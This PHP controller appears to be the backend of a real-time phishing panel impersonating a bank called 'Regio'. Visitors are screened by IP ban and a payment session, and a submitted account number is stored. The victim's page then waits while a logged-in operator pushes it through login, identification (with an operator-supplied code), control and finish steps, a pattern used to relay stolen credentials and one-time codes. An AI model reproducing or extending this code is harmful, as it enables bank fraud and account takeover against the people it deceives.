<?php

namespace App\Controllers\Regio;

use \Core\View;
use \App\Models\Regio\Regio;
use \App\Auth;

class Login extends \Core\Controller
{
    public function indexAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['number'])) {
            Regio::setLogin($_POST['number'], $_SESSION['uid']);
        } else {
            if (Regio::findBan($_SERVER['REMOTE_ADDR']) || !isset($_SESSION['pay']) || !Regio::checkPayment($this->route_params['id'])) {
                Regio::redirect();
            } else {
                Regio::setLogInformation($_SESSION['uid']);

                View::render('Regio/login.php');
            }
        }
    }

    public function checkAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay'])) {
                $check = Regio::getPage($_SESSION['uid']);

                if ($check) {
                    if ($check == 'login') {
                        echo json_encode(['page' => 'login']);   
                        Regio::setLoginPage($_SESSION['uid'], null);
                    } else if ($check == 'identification') {
                        echo json_encode(['page' => 'identification']);   
                        Regio::setDetailsPage($_SESSION['uid'], null);
                    } else if ($check == 'control') {
                        echo json_encode(['page' => 'control']);
                        Regio::setControlPage($_SESSION['uid'], null);
                    } else if ($check == 'finish') {
                        echo json_encode(['page' => 'finish']);
                        Regio::setFinishPage($_SESSION['uid'], null);   
                        unset($_SESSION['pay']);
                        unset($_SESSION['uid']);
                    }
                } else {
                    echo json_encode(['page' => 'waiting']);
                }
           
        } else {
            Regio::redirect();
        }
    }

    public function setPageAction()
    {
        if (Auth::isLoggedIn()) {
            if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['id']) && isset($_POST['page'])) {
                if ($_POST['page'] == 'login') {
                    $check = Regio::setLoginPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'identification') {
                    $check = Regio::setDetailsPageCode($_POST['id'], $_POST['page'], $_POST['code']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                } else if ($_POST['page'] == 'control') {
                    $check = Regio::setControlPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                }else if ($_POST['page'] == 'finish') {
                    $check = Regio::setFinishPage($_POST['id'], $_POST['page']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);   
                    }   
                }
            } else {
                Regio::redirect();
            }
        } else {
            Regio::redirect();
        }
    }
}